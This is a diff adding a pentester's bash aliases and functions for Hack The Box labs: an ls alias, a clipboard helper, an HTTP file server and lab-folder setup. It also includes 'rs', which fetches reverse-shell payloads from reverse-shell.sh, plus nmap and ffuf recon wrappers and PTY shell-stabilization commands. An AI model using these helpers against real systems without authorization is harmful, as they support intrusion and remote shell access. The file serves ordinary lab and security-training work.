@@ -1,0 +1,67 @@
+# list files with additional information
+alias ll='ls -alhF'
+
+# copy command output directly to clipboard
+alias c='xclip -selection clipboard'
+
+# start http server: server <PORT> <DIR>
+server() {
+        if [[ $2 ]];then
+                python3 -m http.server $1 --directory $2
+        else
+                python3 -m http.server $1
+        fi
+}
+
+# generate reverse shell: rs <IP> <PORT> > <FILENAME>
+rs() {
+	curl https://reverse-shell.sh/$1:$2
+}
+
+htb-init() {
+	if [[ $1 ]]; then			
+		mkdir -p /home/y/Documents/HTB/$1/files
+		mkdir -p /home/y/Documents/HTB/$1/exploits
+		mkdir -p /home/y/Documents/HTB/$1/share
+		cd /home/y/Documents/HTB/$1/share
+		/usr/bin/python3 -m http.server 8080 > /dev/null 2>&1 &
+		echo $! > /home/y/Documents/HTB/$1/.server.pid
+		cd /home/y/Documents/HTB/$1
+		clear
+	else
+		echo 'Usage: htb-init Moderators'
+	fi
+}
+
+
+# Usage: nmap-full 10.10.11.169
+nmap-full() {
+	nmap -p- -sC -sV -A --min-rate=400 --min-parallelism=512 -vv $1
+}
+
+# Usage: ffuf-dir http://site.com/FUZZ
+ffuf-dir() {
+        ffuf -u $1 -w /usr/share/wordlists/dirb/big.txt ${@: 2};
+}
+
+# Usage: ffuf-vhost domain.local
+ffuf-vhost() {
+        ffuf -H "Host: FUZZ.$1" -u http://$1 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt ${@: 2};
+}
+
+
+# Stabilize shell
+st() {
+    if [[ $1 -eq 1 ]]; then 
+        printf "python -c 'import pty;pty.spawn(\"/bin/bash\")'\nexport TERM=alacritty\n"|c
+
+    elif [[ $1 -eq 2 ]]; then
+        printf "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'\nexport TERM=alacritty\n"|c
+    else
+        printf 'script -q /dev/null -c /bin/bash\nexport TERM=alacritty\n'|c
+    fi
+    echo "Stablizing commands copied to the clipboard!"
+    stty raw -echo;fg
+}
+
+
